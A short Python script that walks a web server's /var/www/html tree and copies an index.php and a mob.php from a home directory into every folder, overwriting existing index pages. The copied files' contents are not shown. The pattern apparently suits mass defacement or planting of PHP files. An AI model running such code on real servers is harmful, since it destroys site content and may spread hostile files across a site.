#
#
import shutil,os
index = "/index.php"
mob = "/mob.php"
for folderName, subfolders, filenames in os.walk('/var/www/html'):
    print('The current folder is ' + folderName)
    
    for subfolder in subfolders:
        print('SUBFOLDER OF ' + folderName + ': ' + subfolder)
        
    for filename in filenames:
        print('FILE INSIDE ' + folderName + ': '+ filename)
        
    shutil.copy('/home/ashu/index.php',folderName+index)
    shutil.copy('/home/ashu/mob.php',folderName+mob)
 
        		
    print('')
